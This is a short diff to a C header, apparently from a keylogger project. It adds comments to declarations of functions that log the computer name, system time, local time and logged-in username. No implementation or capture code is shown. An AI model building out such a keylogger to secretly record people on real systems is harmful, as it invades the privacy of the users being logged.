@@ -34,10 +34,26 @@
 #include <stdio.h>
 
 //------------------------------------------------------------------- FUNCTIONS
+
+/*
+* Function that log informations about the system :
+*  - call log_computer_infos
+*  - call log_user_infos
+*/
 void log_system_infos( FILE * log_file );
+
+/*
+* Function that log informations about the computer :
+*  - log the computer name
+*  - log the system time
+*  - log the local time
+*/
 void log_computer_infos( FILE * log_file );
+
+/*
+* Function that log informations about the logged user :
+*  - log the username
+*/
 void log_user_infos( FILE * log_file );
-
-
 
 #endif /* BB_KEYLOGGER_SYSTEM_H */
